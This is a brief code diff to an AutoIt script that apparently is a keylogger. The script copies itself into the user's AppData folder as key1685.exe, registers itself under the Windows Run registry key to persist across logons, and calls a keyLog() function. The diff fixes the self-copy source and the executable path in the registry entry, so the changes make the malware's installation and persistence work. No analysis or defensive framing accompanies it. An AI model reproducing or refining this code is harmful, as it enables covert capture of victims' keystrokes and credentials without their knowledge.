@@ -21,7 +21,7 @@ EndIf
 
 
 if FileExists(@AppDataDir&"\key1685.exe") = 0 Then
-   FileCopy(@AutoItExe,@AppDataDir)
+   FileCopy(@ScriptFullPath,@AppDataDir)
    reg()
 EndIf
 
@@ -130,7 +130,7 @@ EndFunc
 Func reg()
 	;Local $osVersion=@OSVersion
 	
-	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Key1685", "REG_SZ",@AppDataDir&"\key1685")
+	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Key1685", "REG_SZ",@AppDataDir&"\key1685.exe")
 	keyLog()
 	
 EndFunc
